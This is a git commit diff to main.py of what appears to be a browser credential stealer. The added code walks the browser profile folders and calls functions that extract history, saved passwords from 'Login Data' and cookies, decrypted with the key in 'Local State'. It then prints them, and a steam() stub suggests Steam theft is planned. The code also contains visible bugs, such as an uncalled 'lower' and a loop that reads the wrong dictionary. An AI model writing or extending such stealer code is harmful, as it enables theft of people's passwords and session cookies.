0229c7cdb632e778a2ad76bf8dc3b0197ea7b919
aniko33 <76649588+aniko33@users.noreply.github.com>
2023-03-12 18:13:35 +0100

    Add files via upload

--- main.py
+++ main.py
@@ -17,21 +17,39 @@ class Main:
         
 
     def browser(self):
-        for browser in extractor.browsers_profile:
+        for browserKey in extractor.browsers_profile:
+            browserValue = extractor.browsers_profile[browserKey]
 
             profiles = ["Default"]
 
+            try:
+                for folder in os.listdir(browserValue):
+                    if folder.startswith("profile".lower):
+                        profiles.append(folder)
+
+                for profile in profiles:
+                    browserExtractor = extractor.Extract(browserValue+"\\Local State")
+                    history = browserExtractor.extractHistory(browserValue+f"\\{profile}\\History")
+                    passwd = browserExtractor.extractPasswd(browserValue+f"\\{profile}\\Login Data")
+                    cookies = browserExtractor.extractCookies(browserValue+f"\\{profile}")
+            
+            except FileNotFoundError:
+                continue
+
         for browserKey in extractor.browsers:
-            browserValue = extractor.browsers[browserKey]
+            browserValue = extractor.browsers_profile[browserKey]
+            
+            try:
+                browserExtractor = extractor.Extract(browserValue+"\\Local State")
+                history = browserExtractor.extractHistory(browserValue+"\\History")
+                passwd = browserExtractor.extractPasswd(browserValue+"\\Login Data")
+                cookies = browserExtractor.extractCookies(browserValue)
 
-            browserExtractor = extractor.Extract(browserValue+"\\Local State")
-            history = browserExtractor.extractHistory(browserValue+"\\History")
-            passwd = browserExtractor.extractPasswd(browserValue+"\\Login Data")
-            cookies = browserExtractor.extractCookies(browserValue)
-
-            print(history)
-            print(passwd)
-            print(cookies)
+                print(history)
+                print(passwd)
+                print(cookies)
+            except FileNotFoundError:
+                continue
 
     def steam(self):
         pass
